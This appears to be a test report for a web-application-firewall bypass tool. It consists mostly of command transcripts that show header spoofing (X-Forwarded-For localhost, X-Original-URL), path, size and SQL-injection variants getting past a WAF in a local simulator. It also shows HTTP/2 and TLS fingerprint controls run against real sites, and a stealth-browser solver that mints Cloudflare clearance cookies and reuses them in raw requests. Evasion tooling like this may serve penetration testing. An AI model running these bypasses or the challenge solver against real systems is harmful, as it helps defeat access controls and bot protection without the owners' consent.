# Limitation test matrix

Date: 2026-11-22. Host: macOS arm64, Python 3.13.15. Every block below is a
verbatim transcript; screenshots are rendered from those exact files by
`tools/shot.py`.

| Old limitation | Now | Evidence |
|---|---|---|
| No HTTP/2, no SETTINGS/priority/pseudo-header control | `h2.py` frame + HPACK layer, `--http2 <profile>`, `--mode h2` | `2-h2-header.png`, `3-h2-size.png`, `6-h2-real.png` |
| No redirect following / cookie minting | `--follow N`, `--cookies` | `4-follow-cookies.png` |
| Challenge page reported as BLOCKED | `CHALLENGE` verdict + solver path | `5-challenge-verdict.png`, `7-solver-e2e.png` |
| Body cap fixed at 1 MiB | `--max-body BYTES` | `6-h2-real.png` (50000-byte baseline) |
| Silent masking when control == baseline | `[!] soft-404 masking` warning | `3-h2-size.png` transcript in TEST-REPORT |
| No TLS knobs | `--ciphers`, `--tls-min`, `--tls-max`, `--alpn` | below |

## 1. h1 escalation ladder (offline sim)

```
$ python3 wafbypass.py -u http://127.0.0.1:8099/admin.php?id=1 --mode all --level 4 -t 4 --repeat 1
[+] SUMMARY variants=72 bypass=12 blocked=56 notfound=3 diff=1 error=0 unstable=0 challenge=0
[+] BYPASS rows: path/double-slash(200), ... method/method-OPTIONS(200)
```

Screenshot: `screenshots/1-h1-levels.png`.

## 2. HTTP/2 header bypass (offline h2c sim)

```
$ python3 wafbypass.py -u http://127.0.0.1:8098/admin.php --http2 chrome --mode header --level 2 -t 2 --repeat 1
[*] transport h2 (ALPN h2) profile=chrome follow=0 cookies=False
[*] baseline GET /admin.php -> 403 / 18 bytes  "403 Blocked by WAF"
[+] SUMMARY variants=9 bypass=4 blocked=5 notfound=0 diff=0 error=0 unstable=0 challenge=0
[+] BYPASS rows: header/xff-127.0.0.1(200), header/xff-localhost(200), header/x-original-url(200), header/x-rewrite-url(200)
```

Screenshot: `screenshots/2-h2-header.png`.

## 3. HTTP/2 data flow + size window (offline h2c sim)

```
$ python3 wafbypass.py -u http://127.0.0.1:8098/submit --http2 plain --mode size --profile generic --preset sqli -t 2 --repeat 1
[+] SUMMARY variants=4 bypass=2 blocked=2 notfound=0 diff=0 error=0 unstable=0 challenge=0
[!] stability: 2/2 confirmed
[+] BYPASS rows: size/size-8192(200), size/size-65536(200)
```

Screenshot: `screenshots/3-h2-size.png`.

## 4. Redirect following + cookie jar (offline h1 sim)

```
$ python3 wafbypass.py -u http://127.0.0.1:8099/redirect --follow 2 --cookies --mode path --level 1 -t 2 --repeat 1
[*] transport h1 follow=2 cookies=True
[*] baseline GET /redirect -> 403 / 18 bytes  "403 Blocked by WAF"
```

The raw `/redirect` answers 302 with `Set-Cookie: minted=1`; with `--follow`
the baseline lands on `/admin`, which the WAF blocks, so the run compares
variants against a blocked baseline instead of a 302.

Screenshot: `screenshots/4-follow-cookies.png`.

## 5. Challenge verdict (offline h1 sim)

```
$ python3 wafbypass.py -u http://127.0.0.1:8099/challenge --mode path --level 1 -t 2 --repeat 1
[!] baseline is a JS/CAPTCHA challenge (cf-mitigated); rerun with --solve-challenge to mint cookies in a browser
[+] SUMMARY variants=4 bypass=0 blocked=0 notfound=1 diff=0 error=0 unstable=0 challenge=3
```

Screenshot: `screenshots/5-challenge-verdict.png`.

## 6. h2 over real TLS + configurable cap

```
$ python3 wafbypass.py -u https://www.wikipedia.org --http2 firefox --mode h2 --max-body 50000 -t 2 --timeout 10 --repeat 0
[*] transport h2 (ALPN h2) profile=firefox follow=0 cookies=False
[*] baseline GET / -> 200 / 50000 bytes
[+] SUMMARY variants=10 bypass=0 blocked=10 notfound=0 diff=0 error=0 unstable=0 challenge=0
```

The same run also completed against `https://www.cloudflare.com` (h2, Huffman
+ dynamic table HPACK, 10/10 variants decoded, 0 errors). `nginx.org` refuses
ALPN `h2` (`tlsv1 alert no application protocol`), which the tool reports as
a baseline failure instead of pretending.

Screenshot: `screenshots/6-h2-real.png`.

## 7. Cloudflare challenge solve + cookie reuse

Solver worker (Scrapling stealth browser, real run):

```
$ .venv/bin/python challenge.py https://nopecha.com/demo/cloudflare 300
{"cookies": {"cf_clearance": "Ck8uhGTK...", "_gcl_au": "...", "_ga": "...", ...},
 "user_agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) ... Chrome/156.0.0.0 Safari/537.36",
 "status": 200, "final_url": "https://nopecha.com/demo", "title": "NopeCHA - CAPTCHA Demo",
 "challenge": false, "error": null}
```

Without the solver, the same URL is a challenge and is labelled as such:

```
$ python3 wafbypass.py -u https://nopecha.com/demo/cloudflare --follow 2 --mode path --level 1 -t 2 --timeout 20 --repeat 1
[*] baseline GET /demo/cloudflare -> 403 / 5717 bytes  "<!DOCTYPE html><html lang="en-US"><head><title>Just a moment..."
[!] baseline is a JS/CAPTCHA challenge (cf-mitigated); rerun with --solve-challenge to mint cookies in a browser
path      double-slash           GET    403     5717   CHALLENGE ...
[+] SUMMARY variants=4 bypass=0 blocked=0 notfound=2 diff=0 error=0 unstable=0 challenge=2
```

With the solver, the minted cookies + UA are injected into raw requests:

```
$ python3 wafbypass.py -u https://nopecha.com/demo/cloudflare --solve-challenge --follow 2 --mode path --level 1 -t 2 --timeout 20 --repeat 1
[*] transport h1 follow=2 cookies=True
[*] challenge solver cookies=6 status=200 title='NopeCHA - CAPTCHA Demo' solved=True
[*] baseline GET /demo/cloudflare -> 200 / 142880 bytes
[+] SUMMARY variants=4 bypass=0 blocked=4 notfound=0 diff=0 error=0 unstable=0 challenge=0
```

A full solve takes 2-5 minutes; `challenge.py` caches the jar in
`~/.cache/wafbypass/<netloc>.json` for 900 s, so the engine run above starts
from the cached clearance and finishes in seconds. `--solver-refresh` forces
a new browser solve.

Screenshots: `screenshots/7a-no-solver.png`, `screenshots/7-solver-e2e.png`.

## 8. TLS knobs (real host)

```
$ python3 wafbypass.py -u https://www.wikipedia.org --ciphers ECDHE-RSA-AES128-GCM-SHA256 \
    --tls-min TLSv1_2 --tls-max TLSv1_3 --alpn http/1.1 --mode method --level 1 -t 2 --timeout 10 --repeat 0
[*] baseline GET / -> 200 / 122506 bytes
[+] SUMMARY variants=3 bypass=0 blocked=1 notfound=0 diff=2 error=0 unstable=0 challenge=0
```

Screenshot: `screenshots/8-tls-knobs.png`.

## Residual gaps

* TLS extension order and TLS 1.3 suite selection remain OpenSSL-controlled.
* Image CAPTCHAs are not solved by the engine; the stealth browser handles
  Cloudflare interstitials/Turnstile only.
* No crawler: only the given URL, one control path, redirect hops and the
  solver page are requested.
